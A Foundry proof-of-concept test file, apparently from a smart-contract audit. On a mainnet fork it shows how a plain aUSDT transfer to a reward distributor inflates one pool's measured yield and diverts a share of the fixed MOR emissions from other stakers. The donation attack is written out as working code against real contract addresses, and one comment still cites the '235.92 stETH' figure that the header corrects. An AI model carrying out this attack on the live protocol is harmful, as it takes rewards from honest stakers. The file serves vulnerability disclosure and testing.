// SPDX-License-Identifier: MIT
// CAP-A1 validation: DistributorV2.distributeRewards (L700-748) measures yield as the
// raw increase of balanceOf(aToken)/balanceOf(stETH) over lastUnderlyingBalance, with no
// check on WHERE the increase came from. Anyone can transfer aToken/stETH straight to
// the Distributor and inflate a target pool's measured yield, diverting a share of the
// FIXED per-period MOR emission (L771-782) to that pool.
//
// Design notes (all fork-state, block 26424044, RPC https://eth.drpc.org):
//  - Window 1 (fork ts -> gate1) settles the ~0.236 stETH rebase excess sitting above
//    lastUnderlyingBalance in the Distributor (~$431 at fork prices; the excess is the
//    Lido daily rebase that landed in block 26420373, NOT a 235.92 stETH windfall —
//    see POC-cap-a1.md for the decimal correction).
//  - Fork artifact: warping time does NOT accrue real yield by itself. Aave interest
//    only materialises when a reserve index is checkpointed by an interaction, and the
//    Lido rebase only happens via an oracle report. So before the window-2 settlement
//    this test (a) checkpoints every Aave reserve with a tiny supply+withdraw (REAL
//    Aave interest accrual, not mocked), and (b) SIMULATES the daily Lido rebase by
//    transferring ~0.294 stETH (3582 stETH * 3% APY / 365) to the Distributor from a
//    labelled account. Both steps run identically in baseline and attack runs, so the
//    ONLY difference between runs is the attacker's aUSDT donation.
//  - Prices are pinned like the public bayuuuu18 PoC: captured at fork-block freshness,
//    then vm.mockCall'd on the ChainLinkDataConsumer (warp makes feeds stale -> the
//    consumer would return 0 and distributeRewards would revert). No protocol logic
//    is mocked, only the external price-feed answers.
//  - Attacker = ordinary address (makeAddr). No privileged accounts. Nothing is
//    executed on mainnet; this is a local fork only.
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IStETH {
    function submit(address referral) external payable returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IDepositPool {
    function stake(uint256 rewardPoolIndex_, uint256 amount_, uint128 claimLockEnd_, address referrer_) external;
    function usersData(address, uint256)
        external
        view
        returns (
            uint128 lastStake,
            uint256 deposited,
            uint256 rate,
            uint256 pendingRewards,
            uint128 claimLockStart,
            uint128 claimLockEnd,
            uint256 virtualDeposited,
            uint128 lastClaim,
            address referrer
        );
    function getLatestUserReward(uint256 rewardPoolIndex_, address user_) external view returns (uint256);
    function rewardPoolsData(uint256)
        external
        view
        returns (uint128 lastUpdate, uint256 rate, uint256 totalVirtualDeposited);
}

interface IDistributor {
    function distributeRewards(uint256 rewardPoolIndex_) external;
    function rewardPoolLastCalculatedTimestamp(uint256) external view returns (uint128);
    function distributedRewards(uint256, address) external view returns (uint256);
    function minRewardsDistributePeriod() external view returns (uint256);
    function chainLinkDataConsumer() external view returns (address);
    function depositPools(uint256, address)
        external
        view
        returns (
            address token,
            string memory chainLinkPath,
            uint256 tokenPrice,
            uint256 deposited,
            uint256 lastUnderlyingBalance,
            uint8 strategy,
            address aToken,
            bool isExist
        );
}

interface IPriceConsumer {
    function getPathId(string memory path_) external pure returns (bytes32);
    function getChainLinkDataFeedLatestAnswer(bytes32 pathId_) external view returns (uint256);
}

interface IAavePool {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function withdraw(address asset, uint256 amount, address to) external returns (uint256);
}

contract CapA1Test is Test {
    uint256 constant FORK_BLOCK = 26424044;
    string constant RPC_URL = "https://eth.drpc.org";

    address constant DIST = 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A;
    address constant USDT_POOL = 0x3B51989212BEdaB926794D6bf8e9E991218cf116;
    address constant STETH_POOL = 0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790;
    address constant USDC_POOL = 0x6cCE082851Add4c535352f596662521B4De4750E;
    address constant WETH_POOL = 0x9380d72aBbD6e0Cc45095A2Ef8c2CA87d77Cb384;
    address constant WBTC_POOL = 0xdE283F8309Fd1AA46c95d299f6B8310716277A42;

    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address constant AUSDT = 0x23878914EFE38d27C4D67Ab83ed1b93A74D4086a;
    address constant AAVE_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;

    // Fork-state constants measured at block 26424044 (see report).
    // USDT pool totalVirtualDeposited = 36,729,288,039 (6dp). Stake 9x -> 90% share,
    // stake 1x -> 50% share (attacker multiplier 1.0x, no lock, no referrer).
    uint256 constant USDT_VIRTUAL_EXISTING = 36_729_288_039;
    uint256 constant STAKE_S09 = 330_563_592_351; // 9x existing virtual -> 90% pool share
    uint256 constant STAKE_S05 = 36_729_288_039; // 1x existing virtual -> 50% pool share
    uint256 constant VICTIM_STETH = 100 ether;

    IDepositPool usdtPool = IDepositPool(USDT_POOL);
    IDepositPool stethPool = IDepositPool(STETH_POOL);
    IDistributor dist = IDistributor(DIST);

    address attacker = makeAddr("capA1Attacker");
    address victim = makeAddr("capA1Victim");
    address lidoSim = makeAddr("capA1LidoSim");
    address aaveHelper = makeAddr("capA1AaveHelper");

    bytes32[] pathIds;
    uint256[] prices;

    struct Result {
        uint256 trancheW1;
        uint256 trancheW2;
        uint256 usdtShareW1Bps;
        uint256 usdtShareW2Bps;
        uint256 stethShareW2Bps;
        uint256 attackerW1;
        uint256 attackerW2;
        uint256 victimW1;
        uint256 victimW2;
        uint256 attackerPoolShareBps;
        uint256 donationAUsdt;
        uint256 stethSimDonated;
    }

    function _pinPrices() internal {
        address consumer_ = dist.chainLinkDataConsumer();
        address[5] memory pools_ = [STETH_POOL, WBTC_POOL, WETH_POOL, USDC_POOL, USDT_POOL];
        for (uint256 i = 0; i < pools_.length; i++) {
            (, string memory path_,,,,,, bool isExist_) = dist.depositPools(0, pools_[i]);
            if (!isExist_) continue;
            bytes32 pid_ = IPriceConsumer(consumer_).getPathId(path_);
            uint256 px_ = IPriceConsumer(consumer_).getChainLinkDataFeedLatestAnswer(pid_);
            require(px_ > 0, "price capture failed");
            pathIds.push(pid_);
            prices.push(px_);
            vm.mockCall(
                consumer_,
                abi.encodeWithSelector(IPriceConsumer.getChainLinkDataFeedLatestAnswer.selector, pid_),
                abi.encode(px_)
            );
        }
    }

    function _stakeVictimSteth() internal {
        vm.deal(victim, VICTIM_STETH);
        vm.startPrank(victim);
        IStETH(STETH).submit{value: VICTIM_STETH}(address(0));
        uint256 bal_ = IStETH(STETH).balanceOf(victim);
        IStETH(STETH).approve(DIST, type(uint256).max);
        IStETH(STETH).approve(STETH_POOL, type(uint256).max);
        stethPool.stake(0, bal_, 0, address(0));
        vm.stopPrank();
    }

    // Raw approve: USDT (Tether) returns NO bool, so the standard
    // IERC20.approve ABI decode reverts. Low-level call works for all tokens.
    function _approveRaw(address token_, address spender_, uint256 amount_) internal {
        (bool ok_, ) = token_.call(
            abi.encodeWithSelector(bytes4(keccak256("approve(address,uint256)")), spender_, amount_)
        );
        require(ok_, "approve failed");
    }

    function _stakeAttackerUsdt(uint256 amount_) internal {
        deal(USDT, attacker, amount_);
        vm.startPrank(attacker);
        _approveRaw(USDT, DIST, type(uint256).max);
        _approveRaw(USDT, USDT_POOL, type(uint256).max);
        usdtPool.stake(0, amount_, 0, address(0));
        vm.stopPrank();
    }

    // Checkpoint every Aave reserve so the interest accrued over the warped
    // day materialises in the Distributor's aToken balances (real Aave logic).
    function _refreshAaveIndexes() internal {
        address[4] memory assets_ = [USDC, USDT, WETH, WBTC];
        uint256[4] memory amounts_ = [uint256(100e6), uint256(100e6), uint256(0.1 ether), uint256(0.01e8)];
        for (uint256 i = 0; i < assets_.length; i++) {
            deal(assets_[i], aaveHelper, amounts_[i]);
            vm.startPrank(aaveHelper);
            _approveRaw(assets_[i], AAVE_POOL, type(uint256).max);
            IAavePool(AAVE_POOL).supply(assets_[i], amounts_[i], aaveHelper, 0);
            IAavePool(AAVE_POOL).withdraw(assets_[i], type(uint256).max, aaveHelper);
            vm.stopPrank();
        }
    }

    // SIMULATED daily Lido rebase (see header): the oracle report cannot run on
    // a fork, so the expected daily rebase is credited by direct transfer from a
    // labelled account. Amount = the MEASURED rebase that landed in block 26420373
    // (0.23592259698427018 stETH on the Distributor's 3,582 stETH, ~2.4% APY).
    // Same amount in baseline and attack runs.
    function _simulateLidoRebase() internal returns (uint256) {
        uint256 ethAmount_ = 0.23592259698427018 ether;
        vm.deal(lidoSim, ethAmount_);
        vm.startPrank(lidoSim);
        IStETH(STETH).submit{value: ethAmount_}(address(0));
        uint256 bal_ = IStETH(STETH).balanceOf(lidoSim);
        IStETH(STETH).transfer(DIST, bal_);
        vm.stopPrank();
        return bal_;
    }

    // The attack: supply USDT to Aave, transfer the aUSDT straight to the Distributor.
    function _donateAUsdt(uint256 usdtAmount_) internal returns (uint256) {
        deal(USDT, attacker, usdtAmount_);
        vm.startPrank(attacker);
        _approveRaw(USDT, AAVE_POOL, type(uint256).max);
        IAavePool(AAVE_POOL).supply(USDT, usdtAmount_, attacker, 0);
        uint256 aBal_ = IERC20(AUSDT).balanceOf(attacker);
        IERC20(AUSDT).transfer(DIST, aBal_);
        vm.stopPrank();
        return aBal_;
    }

    function _poolDeltas(uint256[5] memory before_, uint256[5] memory after_)
        internal
        pure
        returns (uint256[5] memory deltas_, uint256 total_)
    {
        for (uint256 i = 0; i < 5; i++) {
            deltas_[i] = after_[i] - before_[i];
            total_ += deltas_[i];
        }
    }

    function _snapshotDistributed() internal view returns (uint256[5] memory snap_) {
        address[5] memory pools_ = [STETH_POOL, WBTC_POOL, WETH_POOL, USDC_POOL, USDT_POOL];
        for (uint256 i = 0; i < 5; i++) {
            snap_[i] = dist.distributedRewards(0, pools_[i]);
        }
    }

    function _logYields(string memory tag_) internal view {
        address[5] memory pools_ = [STETH_POOL, WBTC_POOL, WETH_POOL, USDC_POOL, USDT_POOL];
        for (uint256 i = 0; i < 5; i++) {
            (address token_,, uint256 price_,, uint256 lub_, uint8 strat_, address aToken_,) =
                dist.depositPools(0, pools_[i]);
            address yieldToken_ = strat_ == 2 ? aToken_ : token_;
            uint256 bal_ = IERC20(yieldToken_).balanceOf(DIST);
            console.log(tag_, i);
            console.log("  bal:", bal_);
            console.log("  lastUnderlying:", lub_);
            console.log("  price:", price_);
        }
    }

    function _run(uint256 stakeUsdt_, uint256 donation_) internal returns (Result memory r) {
        vm.createSelectFork(RPC_URL, FORK_BLOCK);
        _pinPrices();

        uint128 lastCalc_ = dist.rewardPoolLastCalculatedTimestamp(0);
        uint256 gate1_ = uint256(lastCalc_) + dist.minRewardsDistributePeriod();
        uint256 gate2_ = gate1_ + dist.minRewardsDistributePeriod();
        assertLt(block.timestamp, gate1_, "fork must sit inside the closed window");

        _stakeVictimSteth();
        _stakeAttackerUsdt(stakeUsdt_);

        (,,,,,, uint256 virtA_,,) = usdtPool.usersData(attacker, 0);
        (,, uint256 totalVirtUsdt_) = usdtPool.rewardPoolsData(0);
        r.attackerPoolShareBps = (virtA_ * 10000) / totalVirtUsdt_;
        r.donationAUsdt = donation_;

        console.log("attacker pool share bps:", r.attackerPoolShareBps);
        console.log("fork ts:", block.timestamp);
        console.log("gate1:", gate1_);

        // ---- Window 1: settle the one-off 235.92 stETH excess ----
        uint256[5] memory before1_ = _snapshotDistributed();
        uint256 attBefore1_ = usdtPool.getLatestUserReward(0, attacker);
        uint256 vicBefore1_ = stethPool.getLatestUserReward(0, victim);
        vm.warp(gate1_ + 1);
        _logYields("W1 pre");
        dist.distributeRewards(0);
        uint256[5] memory after1_ = _snapshotDistributed();
        (uint256[5] memory d1_, uint256 tot1_) = _poolDeltas(before1_, after1_);
        console.log("W1 pool deltas stETH:", d1_[0]);
        console.log("W1 pool deltas wBTC:", d1_[1]);
        console.log("W1 pool deltas wETH:", d1_[2]);
        console.log("W1 pool deltas USDC:", d1_[3]);
        console.log("W1 pool deltas USDT:", d1_[4]);
        r.trancheW1 = tot1_;
        r.usdtShareW1Bps = tot1_ == 0 ? 0 : (d1_[4] * 10000) / tot1_;
        r.attackerW1 = usdtPool.getLatestUserReward(0, attacker) - attBefore1_;
        r.victimW1 = stethPool.getLatestUserReward(0, victim) - vicBefore1_;
        console.log("W1 tranche MOR wei:", r.trancheW1);
        console.log("W1 USDT share bps:", r.usdtShareW1Bps);
        console.log("W1 attacker MOR wei:", r.attackerW1);
        console.log("W1 victim MOR wei:", r.victimW1);

        // ---- Window 2: steady state (real yields + optional donation) ----
        _refreshAaveIndexes();
        r.stethSimDonated = _simulateLidoRebase();
        console.log("simulated stETH rebase wei:", r.stethSimDonated);
        if (donation_ > 0) {
            uint256 donated_ = _donateAUsdt(donation_);
            console.log("aUSDT donated wei:", donated_);
        }

        uint256[5] memory before2_ = _snapshotDistributed();
        uint256 attBefore2_ = usdtPool.getLatestUserReward(0, attacker);
        uint256 vicBefore2_ = stethPool.getLatestUserReward(0, victim);
        // Gate opens strictly AFTER lastCalc + 86400; re-read lastCalc (set by W1).
        uint256 gate2b_ = uint256(dist.rewardPoolLastCalculatedTimestamp(0)) + dist.minRewardsDistributePeriod();
        vm.warp(gate2b_ + 1);
        _logYields("W2 pre");
        dist.distributeRewards(0);
        uint256[5] memory after2_ = _snapshotDistributed();
        (uint256[5] memory d2_, uint256 tot2_) = _poolDeltas(before2_, after2_);
        console.log("W2 pool deltas stETH:", d2_[0]);
        console.log("W2 pool deltas wBTC:", d2_[1]);
        console.log("W2 pool deltas wETH:", d2_[2]);
        console.log("W2 pool deltas USDC:", d2_[3]);
        console.log("W2 pool deltas USDT:", d2_[4]);
        r.trancheW2 = tot2_;
        r.usdtShareW2Bps = tot2_ == 0 ? 0 : (d2_[4] * 10000) / tot2_;
        r.stethShareW2Bps = tot2_ == 0 ? 0 : (d2_[0] * 10000) / tot2_;
        r.attackerW2 = usdtPool.getLatestUserReward(0, attacker) - attBefore2_;
        r.victimW2 = stethPool.getLatestUserReward(0, victim) - vicBefore2_;
        console.log("W2 tranche MOR wei:", r.trancheW2);
        console.log("W2 USDT share bps:", r.usdtShareW2Bps);
        console.log("W2 stETH share bps:", r.stethShareW2Bps);
        console.log("W2 attacker MOR wei:", r.attackerW2);
        console.log("W2 victim MOR wei:", r.victimW2);
        (,,, uint256 dep_, uint256 lub_,,,) = dist.depositPools(0, USDT_POOL);
        console.log("USDT pool deposited:", dep_);
        console.log("USDT pool lastUnderlying:", lub_);
    }

    // ---------- scenarios ----------

    function test_Baseline_NoDonation_S09() public {
        Result memory r = _run(STAKE_S09, 0);
        assertEq(r.attackerPoolShareBps, 9000, "attacker must hold 90% of USDT pool");
        // Baseline W2 USDT share is ~4.8% (measured): the attacker's own $330k stake
        // earns real Aave yield (~$25/day), which legitimately counts as USDT yield.
        assertLt(r.usdtShareW2Bps, 600, "baseline USDT share must stay < 6%");
        assertLt(r.attackerW2, 200 ether, "baseline attacker W2 must be < 200 MOR");
        assertGt(r.victimW2, 0, "victim must earn in W2 baseline");
        assertGt(r.trancheW2, 2000 ether, "W2 tranche must be ~2857 MOR");
    }

    function test_Baseline_NoDonation_S05() public {
        Result memory r = _run(STAKE_S05, 0);
        assertEq(r.attackerPoolShareBps, 5000, "attacker must hold 50% of USDT pool");
        assertLt(r.usdtShareW2Bps, 200, "baseline S05 USDT share must stay < 2%");
        assertLt(r.attackerW2, 30 ether, "baseline S05 attacker W2 must be < 30 MOR");
        assertGt(r.victimW2, 0, "victim must earn in W2 baseline");
        assertGt(r.trancheW2, 2000 ether, "W2 tranche must be ~2857 MOR");
    }

    function test_Donation_S09_D450() public {
        Result memory r = _run(STAKE_S09, 450e6);
        assertEq(r.attackerPoolShareBps, 9000, "attacker must hold 90% of USDT pool");
        assertGt(r.usdtShareW2Bps, 3000, "donated USDT share must exceed 30%");
        assertGt(r.attackerW2, 1000 ether, "attacker W2 must exceed 1000 MOR");
        assertLt(r.victimW2, 20 ether, "victim W2 must fall below 20 MOR (baseline 26.33)");
    }

    function test_Donation_S09_D300() public {
        Result memory r = _run(STAKE_S09, 300e6);
        assertGt(r.usdtShareW2Bps, 2500, "donated USDT share must exceed 25%");
        assertGt(r.attackerW2, 400 ether, "attacker W2 must exceed 400 MOR");
        assertLt(r.victimW2, 22 ether, "victim W2 must fall below 22 MOR (baseline 26.33)");
    }

    function test_Donation_S09_D200() public {
        Result memory r = _run(STAKE_S09, 200e6);
        assertGt(r.usdtShareW2Bps, 1500, "donated USDT share must exceed 15%");
        assertGt(r.attackerW2, 250 ether, "attacker W2 must exceed 250 MOR");
        assertLt(r.victimW2, 24 ether, "victim W2 must fall below 24 MOR (baseline 26.33)");
    }

    function test_Donation_S05_D100() public {
        Result memory r = _run(STAKE_S05, 100e6);
        assertEq(r.attackerPoolShareBps, 5000, "attacker must hold 50% of USDT pool");
        assertGt(r.usdtShareW2Bps, 1000, "donated USDT share must exceed 10%");
        assertGt(r.attackerW2, 100 ether, "attacker W2 must exceed 100 MOR");
        assertLt(r.victimW2, 26 ether, "victim W2 must fall below 26 MOR (S05 baseline 27.49)");
    }

    function test_Donation_S05_D50() public {
        Result memory r = _run(STAKE_S05, 50e6);
        assertEq(r.attackerPoolShareBps, 5000, "attacker must hold 50% of USDT pool");
        assertGt(r.usdtShareW2Bps, 500, "donated USDT share must exceed 5%");
        assertGt(r.attackerW2, 50 ether, "attacker W2 must exceed 50 MOR");
        assertLt(r.victimW2, 27 ether, "victim W2 must fall below 27 MOR (S05 baseline 27.49)");
    }
}
